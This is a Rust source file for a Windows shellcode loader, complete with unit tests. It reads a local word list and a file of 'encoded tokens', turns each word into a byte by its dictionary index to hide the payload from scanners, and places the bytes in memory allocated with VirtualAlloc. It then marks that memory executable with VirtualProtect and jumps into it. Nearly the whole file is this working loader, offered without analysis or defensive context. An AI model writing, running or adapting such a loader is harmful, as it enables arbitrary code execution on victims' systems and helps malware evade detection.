use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::error::Error;
use std::mem;
use std::ptr;
use std::time::Duration;
use log::{debug, error, info, warn, LevelFilter};
use reqwest::blocking;

use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
};

// Updated URLs to use local files
const DICTIONARY_PATH: &str = "es-dictionary.txt";
const PAYLOAD_PATH: &str = "load.txt";

/// Initialize the logger with appropriate settings
fn setup_logging() -> Result<(), Box<dyn Error>> {
    env_logger::Builder::new()
        .filter_level(LevelFilter::Info)
        .format_timestamp_secs()
        .format_module_path(false)
        .init();
    
    debug!("Logging initialized");
    Ok(())
}

/// Load the dictionary from the local file
fn load_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
    let path = Path::new(DICTIONARY_PATH);
    
    if !path.exists() {
        return Err(format!("Dictionary file not found: {}", DICTIONARY_PATH).into());
    }
    
    info!("Loading dictionary from {}", DICTIONARY_PATH);
    let mut content = String::new();
    File::open(path)?
        .read_to_string(&mut content)?;
        
    let words = content
        .lines()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Loaded {} words from dictionary", words.len());
    
    if words.is_empty() {
        return Err("Dictionary is empty".into());
    }
    
    Ok(words)
}

/// Load the encoded payload from the local file
fn load_payload() -> Result<Vec<String>, Box<dyn Error>> {
    let path = Path::new(PAYLOAD_PATH);
    
    if !path.exists() {
        return Err(format!("Payload file not found: {}", PAYLOAD_PATH).into());
    }
    
    info!("Loading encoded payload from {}", PAYLOAD_PATH);
    let mut content = String::new();
    File::open(path)?
        .read_to_string(&mut content)?;
    
    let tokens = content
        .split_whitespace()
        .map(String::from)
        .collect::<Vec<String>>();
        
    info!("Loaded {} encoded tokens", tokens.len());
    
    if tokens.is_empty() {
        return Err("Payload is empty".into());
    }
    
    Ok(tokens)
}

/// Decode the payload using the dictionary
fn decode_payload(tokens: &[String], dict: &[String]) -> Result<Vec<u8>, Box<dyn Error>> {
    info!("Decoding payload with {} words using {} dictionary entries", tokens.len(), dict.len());
    
    let mut output = Vec::with_capacity(tokens.len());
    
    for (i, token) in tokens.iter().enumerate() {
        if let Some(index) = dict.iter().position(|word| word == token) {
            output.push(index as u8);
        } else {
            // Try parsing as direct byte value
            match token.parse::<u8>() {
                Ok(value) => output.push(value),
                Err(_) => warn!("Token at position {} not found in dictionary: {}", i, token),
            }
        }
    }
    
    info!("Decoded {} bytes of shellcode", output.len());
    
    if output.is_empty() {
        return Err("Decoded payload is empty".into());
    }
    
    Ok(output)
}

/// Execute shellcode using standard Windows APIs
fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
    info!("Executing {} bytes of shellcode", shellcode.len());
    
    unsafe {
        // Allocate memory for shellcode with VirtualAlloc
        let size = shellcode.len();
        debug!("Allocating {} bytes of memory", size);
        
        let base_addr = VirtualAlloc(
            ptr::null_mut(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if base_addr.is_null() {
            return Err("Memory allocation failed".into());
        }
        
        // Copy shellcode to allocated memory
        debug!("Copying shellcode to allocated memory at {:p}", base_addr);
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_addr as *mut u8, size);
        
        // Change memory protection to executable
        let mut old_protect = 0;
        debug!("Changing memory protection to executable");
        
        if VirtualProtect(base_addr, size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            return Err("Failed to change memory protection".into());
        }
        
        // Execute the shellcode
        info!("Executing shellcode at address {:p}", base_addr);
        let entry: extern "system" fn() = mem::transmute(base_addr);
        entry();
        
        info!("Shellcode execution completed");
    }
    
    Ok(())
}

fn main() -> Result<(), Box<dyn Error>> {
    // Initialize logging
    setup_logging()?;
    
    info!("Application starting");
    
    // Get dictionary
    let dict = match load_dictionary() {
        Ok(d) => d,
        Err(e) => {
            error!("Dictionary loading failed: {}", e);
            return Err(e);
        }
    };
    
    // Load encoded payload
    let tokens = match load_payload() {
        Ok(t) => t,
        Err(e) => {
            error!("Payload loading failed: {}", e);
            return Err(e);
        }
    };
    
    // Decode the payload
    let payload = match decode_payload(&tokens, &dict) {
        Ok(p) => p,
        Err(e) => {
            error!("Payload decoding failed: {}", e);
            return Err(e);
        }
    };
    
    // Execute the shellcode
    if let Err(e) = execute_shellcode(&payload) {
        error!("Shellcode execution failed: {}", e);
        return Err(e);
    }
    
    info!("Application completed successfully");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_decode_payload() {
        let dict = vec!["zero".to_string(), "one".to_string(), "two".to_string()];
        let tokens = vec!["one".to_string(), "two".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 2, 0]);
    }
    
    #[test]
    fn test_decode_with_numeric_fallback() {
        let dict = vec!["zero".to_string(), "one".to_string()];
        let tokens = vec!["one".to_string(), "255".to_string(), "zero".to_string()];
        
        let result = decode_payload(&tokens, &dict).unwrap();
        assert_eq!(result, vec![1, 255, 0]);
    }
}
